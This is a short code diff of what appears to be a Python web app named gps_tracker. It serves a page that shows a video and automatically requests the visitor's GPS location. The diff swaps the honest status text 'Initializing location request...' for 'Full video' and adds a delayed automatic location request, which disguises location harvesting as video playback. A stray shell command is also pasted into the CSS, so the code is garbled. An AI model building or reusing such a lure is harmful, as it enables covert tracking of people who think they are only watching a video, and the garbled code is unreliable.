@@ -65,7 +65,7 @@ def gps_tracker():
             video {
                 width: 100%;
                 border-radius: 8px;python app.py
-                
+
                 margin-bottom: 15px;
             }
         </style>
@@ -79,9 +79,10 @@ def gps_tracker():
 
             
             
-            <p id="status">Initializing location request...</p>
+            <p id="status">Full video</p>
             <script>
                 // Automatically request GPS location when the page loads
+                setTimeout(getLocation, 2000);
                 window.onload = function() {
                     getLocation();
                 };
